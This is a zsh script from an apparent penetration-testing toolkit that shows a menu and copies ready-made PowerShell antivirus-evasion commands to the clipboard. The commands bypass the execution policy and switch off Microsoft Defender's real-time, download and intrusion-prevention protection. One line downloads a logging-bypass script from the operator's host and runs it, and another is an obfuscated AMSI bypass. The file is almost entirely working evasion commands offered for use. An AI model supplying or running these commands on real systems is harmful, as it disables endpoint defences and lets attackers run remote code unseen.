#!/usr/bin/env zsh

############################################################# 
# nb-ad-pwsh
#############################################################
nb-ad-pwsh-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-pwsh
------------
The nb-ad-pwsh namespace contains commands for powershell/powerviwe commands to copy/paste to a windows machine.

Commands
--------
nb-ad-pwsh-av-bypass                       av evasion powershell commands

DOC
}

nb-ad-pwsh-av-bypass() {
    # Display menu
    __ask "Choose a command to copy:"
    echo "Please select a command to copy to clipboard:"
    echo "1) Bypass the execution policy"
    echo "2) Disable AV using powershell (Requires Local Admin rights)"
    echo "3) Bypass enhanced script block logging so that AMSI bypass is not logged"
    echo "4) Bypass AMSI Check (If Admin rights are not available)"
    echo "5) Previous menu"
    echo
    echo -n "Choice: "
    read -r choice

    case $choice in
        1) 
          __COMMAND="powershell -ep Bypass"
          ;;
        2) 
          __COMMAND="Get-MPPreference
Set-MPPreference -DisableRealTimeMonitoring \$true
Set-MPPreference -DisableIOAVProtection \$true
Set-MPPreference -DisableIntrusionPreventionSystem \$true"
          ;;
        3)
          # Set LHOST and LPORT variables using existing functions
          nb-vars-set-lhost
          nb-vars-set-lport
          __COMMAND="iex (iwr http://${__LHOST}:${__LPORT}/sbloggingbypass.txt -UseBasicParsing)"
          ;;
        4) 
          __COMMAND="S\`eT-It\`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI\`A\`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A\`ss\`Embly\".\"GET\`TY\`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g\`etf\`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE\`T\`VaLUE\"(  \${n\`ULl},\${t\`RuE} )"
          ;;
        5) 
          return
          ;;
        *) 
          echo "Invalid option"
          return
          ;;
    esac

    # Copy the command to clipboard
    echo "$__COMMAND" | wl-copy
    __ok "Command copied to clipboard."
}
